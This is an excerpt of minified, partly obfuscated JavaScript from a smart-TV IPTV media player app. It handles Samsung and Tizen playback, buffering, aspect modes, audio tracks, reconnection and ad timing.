if(buf==2)return;if(Player.Sef){Player.SefPlugin.Execute('SetInitialBuffer',x_ibuf);if(buf>3){Player.SefPlugin.Execute('SetTotalBufferSize',x_buf);Player.SefPlugin.Execute('SetPendingBuffer',x_ibuf)}}else{Player.plugin.SetInitialBuffer(x_ibuf);if(buf>3){Player.plugin.SetTotalBufferSize(x_buf);Player.plugin.SetPendingBuffer(x_ibuf)}}
console.log("buf="+x_buf+"/"+x_ibuf)};Player.GetResolution=function(){if(playUrl.indexOf('.mp3')<0&&this.w==0){try{if(this.Sef){var return_result=this.SefPlugin.Execute('GetVideoResolution');return_result=return_result.split('|');if(return_result.length>0){this.w=return_result[0];this.h=return_result[1]}}else{this.h=this.plugin.GetVideoHeight();this.w=this.plugin.GetVideoWidth()}}catch(e){this.w=0;this.h=0}};if(this.w==5){this.h=432;this.w=540}else{if(this.w==4){this.h=270;this.w=480}else{if(this.w==3){this.h=288;this.w=384}else{if(this.w<128||this.w==''){this.h=0;this.w=0}}}};var res=this.w+'X'+this.h;if(this.w>0)lI1I1IxFCIh1l01llYpr("infR",Player.w+"x"+Player.h);console.log(res);if(playUrl.indexOf('.mp3')>0){res='- MP3 -'}
if(kjtYpr.GL.xmode==1)lI010lp_Z1l1O0Ypr("FULL");else if(kjtYpr.GL.xmode==0)lI010lp_Z1l1O0Ypr("ORIGINAL");else if(kjtYpr.GL.xmode==2)lI010lp_Z1l1O0Ypr("MANUAL "+kjtYpr.GL.Pw+"%/"+kjtYpr.GL.Ph+"%")};Player.OnBufferingStart=function(){if($_("playerBottom").style.display=="none"&&$_("loading").style.display=="none")lI010lp_Z1l1O0Ypr("_FPZagruzka_. 1%");else lI1I1IxFCIh1l01llYpr("infR","_FPZagruzka_. 1%")};Player.OnBufferingProgress=function(per){videoLoad("on",Player.cur_time);if($_("playerBottom").style.display=="none")lI010lp_Z1l1O0Ypr("_FPZagruzka_. "+per+"%");else lI1I1IxFCIh1l01llYpr("infR","_FPZagruzka_. "+per+"% ");clearTimeout(Player.start_timeout)};var last_w=0,last_h=0;Player.OnBufferingComplete=function(){clearTimeout(Player.start_timeout);clearTimeout(buffering_timer);setTimeout('videoLoad("off", Math.random());',500);glSec=0;this.jump=!1;try{Player.total_time=parseInt((Player.Sef)?Player.SefPlugin.Execute('GetDuration'):Player.plugin.GetDuration())}catch(e){};if(Player.total_time<1)setTimeout("Player.total_time = parseInt((Player.Sef) ? Player.SefPlugin.Execute('GetDuration') : Player.plugin.GetDuration());",1200);Player.total_time=Math.ceil(this.total_time/1000);console.log("total time="+this.total_time);Player.GetResolution();getVideoPlayInfo();if(playUrl.indexOf('.mp3')<0)setTimeout("Player.setSize("+kjtYpr.GL.xmode+");",100);Player.GetAudioNum();lI1I1IxFCIh1l01llYpr("infR",Player.w+"x"+Player.h)};var sefUrl="";Player.SEFPlay=function(x_url,x_sec,mode){sefUrl=x_url;if(mode)Player.SefPlugin.Close();Player.SefPlugin.Open('Player','1.000','Player');console.log("x_url="+x_url);Player.SefPlugin.Execute('InitPlayer',x_url);Player.SefPlugin.OnEvent='Player.SefOnEvent';if(Player.get3DMode()!=0){if(kjtYpr.buffer>10){kjtYpr.buffer=10};console.log("3d prop");Player.SefPlugin.Execute('SetPlayerProperty','2','3',Player.get3DMode())}else{if(x_url.indexOf('.mp3')>0){if(kjtYpr.buffer>0.5){kjtYpr.buffer=0.5};Player.SefPlugin.Execute('SetPlayerProperty','5','0','0')}};if(kjtYpr.GL.timeoutiptv>49)Player.SefPlugin.Execute('SetInitialTimeOut',kjtYpr.GL.timeoutiptv);Player.SefPlugin.Execute('StartPlayback',x_sec)};function setProp(n){if(plmini_on)return;if(n<0)n=2;else if(n>2)n=0;if(n==0){var text='ORIGINAL';webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_LETTER_BOX")}else if(n==1){text='FULL';webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_FULL_SCREEN")}else if(n==2){text='AUTO';webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_AUTO_ASPECT_RATIO")}
kjtYpr.GL.xmode=n;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));var streaminfo=webapis.avplay.getCurrentStreamInfo();for(var i=0;i<streaminfo.length;i++){if(streaminfo[i].type=="VIDEO"){var j=l0QO11lOz0bfh10l0Ypr(streaminfo[i].extra_info);text+=" "+j.Width+"x"+j.Height}}
lI010lp_Z1l1O0Ypr(text)}
Player.setSize=function(x_mode){if(plmini_on)return;var x_res=960,y_res=540;if(this.w==0||this.w=='')Player.GetResolution();var area_x,area_y,area_w,area_h,crop_x,crop_y,crop_w,crop_h,text;area_x=0;area_y=0;area_w=960;area_h=540;crop_x=0;crop_y=0;crop_w=this.w;crop_h=this.h;if(playElement.chat!=""){if(this.Sef){this.SefPlugin.Execute('SetDisplayArea',0,0,750,540)}else{this.plugin.SetDisplayArea(0,0,750,540)};lI010lp_Z1l1O0Ypr("CHAT");return}
if(this.w==0||this.w=='')return;switch(x_mode){case 0:if(crop_w/crop_h<1.79||this.w==0){text='ORIGINAL';area_w=y_res*crop_w/crop_h;area_x=(x_res-area_w)/2}else{text='ORIGINAL';area_h=x_res*crop_h/crop_w;area_y=(y_res-area_h)/2};break;case 1:text='FULL';break;case 2:text='MANUAL';if(this.change){text+=" "+kjtYpr.GL.Pw+"%/"+kjtYpr.GL.Ph+"%"}else kjtYpr.SetZoom=!1;if(kjtYpr.GL.Pw<=100){area_w=(x_res/100)*kjtYpr.GL.Pw;area_x=(x_res-area_w)/2}else{crop_x=crop_w*(kjtYpr.GL.Pw/200-0.5);crop_w=crop_w*(2-kjtYpr.GL.Pw/100)}
if(kjtYpr.GL.Ph<=100){area_h=(y_res/100)*kjtYpr.GL.Ph;area_y=(y_res-area_h)/2}else{crop_y=crop_h*((kjtYpr.GL.Ph/200)-0.5);crop_h=crop_h*(2-kjtYpr.GL.Ph/100)}
if((kjtYpr.GL.Pw>100||kjtYpr.GL.Ph>100)&&(kjtYpr.serieF||kjtYpr.serieH))text+="";break;default:Player.setSize(0);return;text='Не определён!';break};if(this.Sef){this.SefPlugin.Execute('SetDisplayArea',area_x,area_y,area_w,area_h);if(x_mode!=1)this.SefPlugin.Execute('SetCropArea',crop_x,crop_y,crop_w,crop_h);else if(this.change)this.SefPlugin.Execute('SetCropArea',0,0,0,0)}else{this.plugin.SetDisplayArea(area_x,area_y,area_w,area_h);if(x_mode!=1)this.plugin.SetCropArea(crop_x,crop_y,crop_w,crop_h);else if(this.change)this.plugin.SetCropArea(0,0,0,0)};lI010lp_Z1l1O0Ypr(text);this.change=!0};Player.OnCurrentPlayTime=function(_0xf8efx1e){Player.oncur++;if($_("loading").style.display=="block"){videoLoad("off",Math.random())}
this.cur_time=parseInt(_0xf8efx1e,10);this.cur_time=Math.ceil(this.cur_time/1000);if(last_w!=this.w||last_h!=this.h){}
getVideoPlayInfo()};var iptv_succed=!1;Player.SefOnEvent=function(num,_0xf8efx2e){switch(num){case 1:case 3:case 4:case 6:if(is_rek&&rek_url!=""){console.log(event);err_rek("errloadfilesams"+num);return}
if(handler=="menu"||rek_url!=""||terminated)return;if(Player.cur_time==0)gP().sendStat(0);if(kjtYpr.GL.timeoutiptv>55)return;if((!pstream||is_vod(playUrl))&&Player.cur_time>0){if(num==4){setTimeout("samsStop();	l0OIQIl1OI0IlI0lIYpr('"+sefUrl+"',true,"+Player.cur_time+");",2500);lI010lp_Z1l1O0Ypr("_FPSoedineniePrervano_!"+Player.cur_time+sefUrl)}
return}
iptv_retry++;if(pstream&&!is_vod(playUrl)&&iptv_succed){samsStop();setTimeout("l0OIQIl1OI0IlI0lIYpr(playUrl,true);",500);lI010lp_Z1l1O0Ypr("_FPOshibka_! _FPPodkluchenie_ "+iptv_retry+"...");return}
if(iptv_retry>3){l1llOQI10lW1l_II101Ypr()}else{if(!plmini_on){if(num==1)var t=" _FPsoedineniya_";else if(num==3)t=" 404";else if(num==4)t=" _FPpodklucheniya_";else t="";lifeN=0;lifeSec=-1;videoLoad("on");samsStop();playUrl=streamnum(playElement.url,1);l0OIQIl1OI0IlI0lIYpr(playUrl,!0);lI010lp_Z1l1O0Ypr("_FPOshibka_"+t+"! _FPPodkluchenie_  "+(iptv_retry+1)+"...")}}
break;case 11:Player.OnBufferingStart();iptv_succed=!0;break;case 12:iptv_succed=!0;iptv_retry=0;Player.OnBufferingComplete();l0IOlIO00JlIIOlOYpr();break;case 13:iptv_succed=!0;Player.OnBufferingProgress(_0xf8efx2e);break;case 14:if($_("loading").style.display=="block"){videoLoad("off",Math.random())}
Player.OnCurrentPlayTime(_0xf8efx2e);break}};Player.SEFSetNextAudioStream=function(n){if(!this.Sef){lI010lp_Z1l1O0Ypr('_FPNedostupno_!')}else{try{if(this.tnum<2){lI010lp_Z1l1O0Ypr('_FPDrugZvDorNet_!')}else{var x_val0=this.SefPlugin.Execute('GetCurrentStreamID',1);if(x_val0>=0){x_val0+=n;if(x_val0>(this.tnum-1)){x_val0=0}else if(x_val0<0){x_val0=(this.tnum-1)}
Player.SetAudioStream(x_val0,1)}}}catch(e){}}};Player.LangCodes={6514793:'Китайская',6647399:'Английская',6713957:'Француская',6776178:'Немецкая',6911073:'Итальянская',6975598:'Японская',7040882:'Корейская',7368562:'Португальская',7501171:'Русская',7565409:'Испанская'};Player.SetAudioStream=function(x_val0,x_val1){if(this.tnum>x_val0){kjtYpr.a_num=(x_val0+1).toString();this.SefPlugin.Execute('SetStreamID',1,x_val0);var langCode=this.SefPlugin.Execute('GetStreamLanguageInfo',1,x_val0);var _0xf8efxcf=Player.LangCodes[langCode];_0xf8efxcf=(_0xf8efxcf==null)?'Неизвестная':langCode;lI010lp_Z1l1O0Ypr('_FPZvukDorozhka_ №'+(x_val0+1).toString())}else{}};Player.GetAudioNum=function(){this.tnum=1;if(this.Sef){try{this.tnum=this.SefPlugin.Execute('GetTotalNumOfStreamID',1)}catch(e){this.tnum=1}}};Player.Set3Dtype=function(n){if(this.Screen3Dplugin!=null){try{if(1==this.Screen3Dplugin.Flag3DEffectSupport()||this.Screen3Dplugin.Flag3DTVConnect()==1){Player.mode3D+=n;if(Player.mode3D>2)Player.mode3D=0;else if(Player.mode3D<0)Player.mode3D=2;switch(Player.mode3D){case 0:lI010lp_Z1l1O0Ypr('3D OFF');break;case 1:lI010lp_Z1l1O0Ypr('3D SIDE - BY - SIDE');break;case 2:lI010lp_Z1l1O0Ypr('3D TOP - BOTTOM');break};Player.Screen3Dplugin.Set3DEffectMode(Player.mode3D)}else lI010lp_Z1l1O0Ypr('3D _FPnePodderzhivaetsya_!')}catch(e){lI010lp_Z1l1O0Ypr("3D error:"+e)}}else lI010lp_Z1l1O0Ypr('3D _FPnePodderzhivaetsya_!')};var buffering_timer=null;function pauseMedia(){clearTimeout(slideTimer);if(playUrlAudio!="")sound.pause();if(paused)setTimeout("hidePlayer(true);",1000);if(is_img(playUrl)||gV(playElement,"type")=="img"){if(!is_rek)kjtYpr.popUp("_FPSlideshow_: _FPOstanovleno_",1200);paused=!0;return}
lI1I1IxFCIh1l01llYpr("recovery","");if(rek_url=="")lI0lOIE0IjIIlOO1Ypr=0;if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].pause()}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){jwplayer("jw").pause()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){webapis.avplay.pause()}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){if(stb.canPause()){stb.pause()}else{stb.stop()}}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.Pause()}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){if(Player.Sef){Player.SefPlugin.Execute('Pause')}else{Player.plugin.Pause()}}else{if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){video.pause()}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){media.play(0)}}
SaveTime();buffering_timer=setTimeout('kjtYpr.longpause=true;',30000);paused=!0}
function goMedia(){console.log("gom"+lIO1OIOlAQzl1Ol1lYpr);if(playUrlAudio!="")sound.play();if(is_img(playUrl)||gV(playElement,"type")=="img"){if(!is_rek){if(!paused){if(slide_mode==5000)slide_mode=9000;else if(slide_mode==9000)slide_mode=13000;else slide_mode=5000}
startslide();kjtYpr.popUp("_FPSlideshow_: "+(slide_mode/1000)+"_FPsec_.",1200)}
paused=!1;return}
if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].play()}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){jwplayer("jw").play()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){webapis.avplay.play()}else if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.resume()}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){stb.Continue()}else if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){if(Player.Sef){Player.SefPlugin.Execute('Resume')}else{Player.plugin.Resume()};if(playUrl.indexOf('http')==0&&kjtYpr.longpause){setTimeout('lI1llO1QIebXl10lO1Ypr(-3);',100)}}else{if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){video.play()}else if(lIO1OIOlAQzl1Ol1lYpr=="media"||lIO1OIOlAQzl1Ol1lYpr=="ext"){media.play(1)}}
clearTimeout(buffering_timer);kjtYpr.longpause=!1;paused=!1;l0IOlIO00JlIIOlOYpr();if(platform=="android-device"){setVideoResolution()}}
function samsStop(){try{stopped=!0;terminated=!0;$_("loading").style.display="none";if(Player.mode3D!=0)Player.Screen3Dplugin.Set3DEffectMode(0);Player.mode3D=0;Player.total_time=0;Player.cur_time=0;Player.oncur=0;if(Player.Sef){Player.SefPlugin.Execute('Stop');Player.SefPlugin.Execute('ClearScreen');Player.SefPlugin.Close()}else{if(Player.plugin!=null){Player.plugin.Stop();Player.plugin.ClearScreen()}}}catch(e){}}
var timeF=0,timerF;function focuschange(h){console.log("Focus: "+h+" / "+timeF);if(h.match(/false/i)){timeF=T.inetTime}
if(h.match(/true/i)&&(handler=="player"||handler=="qual")){console.log("autook "+(T.inetTime-timeF));if(timeF>0&&(T.inetTime-timeF)>40000){console.log("pstream "+pstream+" ident "+gV(playElement,"ident")+" is_img "+is_img(playUrl));endvideo(1)}else l1llOQI10lW1l_II101Ypr()}}
var is_adult=!1;function l1llOQI10lW1l_II101Ypr(noforce){timeF=0;sethash();if(!plmini_on)SaveTime();if(app_cors_once&&!app_cors){app_cors_once=!1;app_cors=app_cors_orig;console.log("set app_cors orig")}
if(gV(playElement.event,"onstopvideo")!=""){var myImage=new Image(1,1);myImage.src=addident(playElement.event.onstopvideo.replace("[curTime]",curTime).replace("[totalTime]",totalTime))}
lI0lI1O1l1Pa100l0Ypr();sendr=!0;stopped=!0;iptv_succed=!1;Player.cur_time=0;Player.total_time=0;curTime=-1;totalTime=0;PLINDEX=-1;subsrc=[];kjtYpr.inf("",1);if(playUrlAudio!=""){if(sound!=null)sound.src=""}
$_("popUp").style.display="none";$_("subtitle").style.display="none";clearInterval(timerSub);flashmode=null;console.log("stop "+platform);console.log("rek_url "+rek_url);clearTimeout(loaderTimer);clearTimeout(timerF);clearTimeout(slideTimer);clearTimeout(endTimer);clearTimeout(plmini_timer);clearTimeout(eventtimer);clearTimeout(timeoutWork);clearTimeout(advTimer);kjtYpr.inf("");epg_select=-1;clearTimeout(setRekTimer);clearTimeout(l1l1lO1NIl1I1ll1YprTimer);lI1I1IxFCIh1l01llYpr("chat","");lI1I1IxFCIh1l01llYpr("epg_full","");$_("chat").style.display="none";$_("epg_full").style.display="none";var curPage=gP()||IlIOIO();if(curPage.lIQ0Il1IlIb1Il1OYpr.indexOf("extensions://")==0){$_("ext").style.display="block";$_("frame-id").contentWindow.postMessage({'cmd':'focus','text':''},"*")}
if(noforce&&handler=="menu")return;if(is_img(playUrl)||playUrl=="description"||gV(playElement,"type")=="img"){lI1I1IxFCIh1l01llYpr("jw","");$_("jw").style.display="none";playUrl="";if(l0I110IO1SyqII1lI1Ypr)if($_("vk_audio").style.zIndex=="-5"){$_("vk_audio").style.zIndex="0";$_("vk_audio").style.display="block"}}else{plmini_on=!1;is_loadpage(0);if(minimize){minimizeplayer(!1)}
if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){$_("jw").style.zIndex="0";$_("jw").style.display="none";uplayer[lIO1OIOlAQzl1Ol1lYpr].stop()}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){jwplayer("jw").remove()}
if(platform=="sams"&&lIO1OIOlAQzl1Ol1lYpr=="media"){$_("loading").style.display="none";samsStop()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){console.log("tizen stop");try
{webapis.avplay.stop();webapis.avplay.close()}catch(e){console.log(e)}
$_("av-player").style.display="none"}else{if(Math.random()>0.4&&$_("player").style.display=="block"&&rek_url==""){if((platform=="sams"||uaJ=="sony"||uaJ=="pa"||uaJ=="mag")&&Math.random()>0.62)kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPBlueKnProporcii_");else{if(curPage.is_iptv>2){if(Math.random()>0.6)kjtYpr.popUp("_FPNplI101Q1CGOl1lYpr_?<br> <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPVmEmVp_");else kjtYpr.popUp("_FPNplI101Q1CGOl1lYpr_?<br>_FPVoVremProsNazh_ <span style='background-color:orange;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPdVp_. ")}else if(Math.random()>0.6)kjtYpr.popUp("_FPVmVpostBiCe_ "+((pstream)?"IPTV":"_FPVi"+"deo_")+" _FPpleer_а <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ -> HTML5 _FPpleer_ / _FPVstroenniy_</i>");else kjtYpr.popUp("_FPHotChtVfon_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPvVrPrVid_</i>");if(Math.random()>0.3)kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPKnInfoPerRezh_")}}
if(uaJ=="dune"&&lIO1OIOlAQzl1Ol1lYpr=="media"){try{stb.stop()}catch(e){}
$_("dune-api").style.zIndex="0"}else if(uaJ=="mag"&&lIO1OIOlAQzl1Ol1lYpr=="media"){try{stb.Stop()}catch(e){console.log(e)}}else{try{pauseMedia()}catch(e){console.log(e)}
if(lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){lI1I1IxFCIh1l01llYpr("other","");$_("other").style.display="none";setidprop("other",-1);$_("jw").style.display="none";try{video.style.display="none";video.src=""}catch(e){}}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"){video.style.display="none";video.src=""}else{$_("jw").style.display="none";lI1I1IxFCIh1l01llYpr("jw","");lI1I1IxFCIh1l01llYpr("other","")}}}}
videoLoad("off",Math.random());handler="menu";$_("QualCh").style.display="none";$_("player").style.display="none";$_("main").style.display="block";$_("recovery").style.display="none";if(curPage.is_iptv>2){jsc_142427789(null,"notimer")}
FXMLPage.lIlO1OI1Mlt001lIYpr();$_("bcg1").style.display="none";$_("bcg2").style.display="none";$_("playermini").style.display="none";linkOver();set_times();if(platform=="sams")Player.cur_time=0;$_("whitestripes1").style.display="none";$_("whitestripes2").style.display="none"}
function selectLang(){$_("QualCh").style.display="block";var l1II1IlOORHvj11O1Ypr="";kjtYpr.l0IlII1xde1110llYpr=0;try{if(video.audioTracks.length>1){for(var i=0;i<video.audioTracks.length;i++){l1II1IlOORHvj11O1Ypr=l1II1IlOORHvj11O1Ypr+"<div class='menuchannel' id='audioCh"+i+"' style='font-size:21px;'>"+video.audioTracks[i].language+"</div>"}}else l1II1IlOORHvj11O1Ypr=l1II1IlOORHvj11O1Ypr+"<div class='menuchannel' style='color:gray;font-size:21px;'>_FPOneaudiotrack_</div>"}catch(e){l1II1IlOORHvj11O1Ypr=l1II1IlOORHvj11O1Ypr+"<div class='menuchannel' style='color:gray;font-size:21px;'>_FPOneaudiotrack_</div>"}
$_("QualCh").style.display="block";lI1I1IxFCIh1l01llYpr("QualCh",$_("QualCh").innerHTML+l1II1IlOORHvj11O1Ypr);handler="qual";kjtYpr.ll1I1IIOI0ohA1I1IYpr()}
var advTimer,setRekTimer,l1l1lO1NIl1I1ll1YprTimer,lifeSec=-1,lifeN=0;function l1l1lO1NIl1I1ll1Ypr(){if(gP().is_iptv>2||(!is_vod(playElement.url)&&pstream)){l1l1lO1NIl1I1ll1YprTimer=setTimeout("l1l1lO1NIl1I1ll1Ypr();",1200);if(stopped||paused||$_("loading").style.display=="block")return;if(kjtYpr.GL.timeoutiptv>55)return;curTime=getCur();if((iptv_succed||curTime>0||(curTime==0&&(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2")&&kjtYpr.series!="LW"))){if(curTime!=lifeSec){lifeN=0;lifeSec=curTime}else{lifeN++;if(ttmac)kjtYpr.popUp("lifeN"+lifeN,1000);if(lifeN>12&&lifeN>kjtYpr.GL.timeoutiptv*1.2){lifeN=0;lifeSec=-1;iptv_retry++;easystop(1);if(iptv_retry>2)gP().sendStat(0);l0OIQIl1OI0IlI0lIYpr(playUrl,!0);lI010lp_Z1l1O0Ypr("_FPPodkluchenie_ "+iptv_retry+"...")}}}}}
var rekLifeTimer;function rekLife(){if(!is_rek)return;if(is_img(playUrl)||gV(playElement,"type")=="img")return;rekLifeTimer=setTimeout("rekLife();",1000);if(paused||rek_url=="")return;console.log("rekLife "+getCur()+"/"+lifeN+"/"+paused);curTime=getCur();if(curTime!=lifeSec){lifeN=0;lifeSec=curTime}else{lifeN++;if(lifeN>10){if(ttmac)kjtYpr.popUp("REK END LifeN "+lifeN);lifeN=0;lifeSec=-1;if(curTime<1)err_rek("errreklifeend0");else err_rek("errreklifeend")}}}
function is_show_rek(){var ti=kjtYpr.l1O0l1gmmv01O11Ypr("rek");if(ti=="")ti=0;if(isNaN(ti))ti=0;console.log("rek_url="+rek_url);console.log("rek_last="+rek_last);console.log("rek_num="+rek_num);console.log("is_white()="+is_white());console.log(T.inetTime-rek_last);if(rek_q>9)return!1;if(rek_num>0)return!1;if(rek_url==""&&rek_last>0&&T.inetTime-rek_last>rek_interval&&is_white()){console.log("interval exceed "+rek_interval);return!0}
if(ttmac){if(rek_url==""&&rek_last>0&&is_white()&&T.inetTime-ti<rek_interval)
setTimeout(function(){kjtYpr.popUp("Next rek "+Math.ceil((rek_interval-(T.inetTime-ti))/60000),1200)},1200)}
if(rek_url!=""){if(!is_white()){is_adult=!0;rek_url="";return!1}
if(T.inetTime-ti<rek_interval){return!1}else return!0}}
function arrurl(u){console.log("ARR "+kjtYpr.GL.quality+" / "+u);var url="";try{var z=l0QO11lOz0bfh10l0Ypr(u);if(z!=null){var n=0,nmin=10;for(var i=0;i<z.length;i++){if(z[i][2]<nmin&&kjtYpr.GL.quality<=z[i][2]){console.log("NURL n="+i);n=i;nmin=z[i][2]}}
url=z[n][1];console.log("ARRURL n="+n);console.log(z[n]);if(url==null||url=="null"||url==""){l1llOQI10lW1l_II101Ypr();is_loadpage(-1);return}
kjtYpr.l0O1011I0MAZWd0100lIYpr=z;console.log(kjtYpr.l0O1011I0MAZWd0100lIYpr);subsrc=[];if(z[n][3]!=null)if(z[n][3][0][0]!=null)subsrc=z[n][3]}}catch(e){}
return url}
function streamnum(url,m){if(typeof url=="object"){if(url.length>0){if(gV(playElement,"stream_num")=="")playElement.stream_num=0;if(m)playElement.stream_num++;if(typeof url[playElement.stream_num]=="undefined")playElement.stream_num=0;url=url[playElement.stream_num];console.log("numurl "+playElement.stream_num+" "+url)}}
return url}
var pstr="",playElement={},is_arc=!1;function ll0lIOsIoIIlOlYpr(pe){playElement=pe;if(!is_rek&&rek_url!=""){rek_url=""}
oInset[insetActive].stopLoad();url=playElement.url;playElement.ident=getIdent();console.log(playElement.ident+": "+url);url=streamnum(url);if(rek_url!=""){pstream=(rek_url.indexOf(".m3u8")>0)?1:0;lIO1OIOlAQzl1Ol1lYpr=(pstream)?kjtYpr.GL.streamplayer:kjtYpr.GL.player;if(platform=="android-device")lIO1OIOlAQzl1Ol1lYpr="html5";if(platform=="sams")lIO1OIOlAQzl1Ol1lYpr="media";console.log("rek type "+lIO1OIOlAQzl1Ol1lYpr);if(ttmac){setTimeout('kjtYpr.popUp("REK: '+rek_url+'", 2000);',6500)}
handler="player";playElement={};setTimeout("l0OIQIl1OI0IlI0lIYpr(rek_url);",70);return}
try{if(url==null||url==undefined){kjtYpr.popUp("_FPPustayaSsilka_");l1llOQI10lW1l_II101Ypr();return}
lI1I1IxFCIh1l01llYpr("epg_full","");if(url.indexOf("[")==0)url=arrurl(url);else if(url.indexOf("{")==0){playElement.json_url=l0QO11lOz0bfh10l0Ypr(url);if(playElement.json_url==null){kjtYpr.inf("Error JSON decode stream url. Must be {\"720\":{\"url\":\"\",\"title\":\"\"}}",1800)}else lO1ll1n1_olOlOYpr(playElement);return}else if(url.indexOf("NotFound")==0){return}
if(url.indexOf("[")==0)url=arrurl(url);if(is_m3u8(url))pstream=!0;else pstream=!1;statusbar(url,"link");console.log("pstream "+pstream+" openwith "+gV(elCh,"openwith")+" url="+url);console.log("lIO1OIOlAQzl1Ol1lYpr = "+lIO1OIOlAQzl1Ol1lYpr);if(gV(elCh,"openwith")==""){if(url.indexOf("#playerjs")>0){url=url.replace("#playerjs","");lIO1OIOlAQzl1Ol1lYpr="playerjs"}else if(platform=="tizen"){lIO1OIOlAQzl1Ol1lYpr=(pstream)?kjtYpr.GL.streamplayer:kjtYpr.GL.player}else{if(url.indexOf("#media")>0){lIO1OIOlAQzl1Ol1lYpr="media";url=url.replace("#media","")}else lIO1OIOlAQzl1Ol1lYpr=(pstream)?kjtYpr.GL.streamplayer:kjtYpr.GL.player}}else lIO1OIOlAQzl1Ol1lYpr=gV(elCh,"openwith");var orig_url=url;console.log("url="+url);handler="player";setPosition(0);$_("main").style.display="none";if(platform=="android-device"&&rek_url!="")lIO1OIOlAQzl1Ol1lYpr="html5";$_("player").style.display="block";optLangSel=0;$_("QualCh").style.display="none";if(is_img(url)||gV(playElement,"type")=="img")hidePlayer();else resetProgress();$_("main").style.display="none";if(typeof playElement.subtitles=="object"){console.log("sub="+playElement.subtitles);subsrc=playElement.subtitles}else if(gV(playElement,"subtitles")!=""){playElement.subtitles=l0QO11lOz0bfh10l0Ypr(playElement.subtitles);if(typeof playElement.subtitles=="object")subsrc=playElement.subtitles}
console.log("SUBSRC");console.log(typeof playElement.subtitles);console.log(playElement);console.log(subsrc);stopped=!1;info_mode=0;iptv_retry=0;startM=0;Player.oncur=0;console.log("curPage.lIQ0Il1IlIb1Il1OYpr="+curPage.lIQ0Il1IlIb1Il1OYpr+" is_vod="+is_vod(url)+" pstream="+pstream);if(gP().is_iptv>2||(!is_vod(url)&&pstream)){clearTimeout(l1l1lO1NIl1I1ll1YprTimer);lifeN=0;lifeSec=-1;l1l1lO1NIl1I1ll1YprTimer=setTimeout("l1l1lO1NIl1I1ll1Ypr();",2000);epg_channels=curPage.channels;epg_select=select;$_("progressBall").style.display="none";getshowEpg()}else{epg_channels=[];epg_select=-5;$_("progressBall").style.display="block"}
if(gV(playElement,"catchup")!=""||gV(playElement,"catchup_days")!=""){is_arc=1;$_("progressBall").style.display="block";if(gV(playElement,"catchup")=="")playElement.catchup="default";if(gV(playElement,"catchup_days")=="")playElement.catchup_days=3;if(gV(playElement,"arcCurTime")!=""){arc_timestamp=parseInt(playElement.arcCurTime);arc_fwd=arc_timestamp-T.timestamp}}else is_arc=0;lastView2=lastView;lastView=select;lastViewTitle2=lastViewTitle;lastViewTitle=playElement.title;lastViewUrlOrig=url;renderPlayer(url);console.log("PlMedia="+url);if(plmini_on)l0OIQIl1OI0IlI0lIYpr(url);else{playUrl=url;setTimeout("l0OIQIl1OI0IlI0lIYpr(playUrl);",70)}
triggerHide();videoLoad("on");getSaveTime()}catch(e){console.log(e);kjtYpr.popUp("Err Play media:<br>"+e.message);l0OIQIl1OI0IlI0lIYpr(url)}
if(subsrc.length>0)lI010lp_Z1l1O0Ypr(" ")}
var lastSec=0,loaderTimer=null;function videoLoad(mode,sec){console.log("videoLoad "+mode);if(lIO1OIOlAQzl1Ol1lYpr=="jw"){$_("loading").style.display="none";return}
if(ttmac){kjtYpr.popUp("videoLoad "+mode+"<br>"+sec,400);pop2msg=[]}
clearTimeout(loaderTimer);if(plmini_on){$_("loading").style.left=css_w(1020)+"px";$_("loading").style.top=css_wh(innerH-185)+"px"}else{$_("loading").style.left=css_w(580)+"px";$_("loading").style.top=css_wh(250)+"px"}
if(mode=="on"){if(handler=="menu"&&!plmini_on)return;$_("loading").style.display="block";if(sec!=null){lastSec=sec}
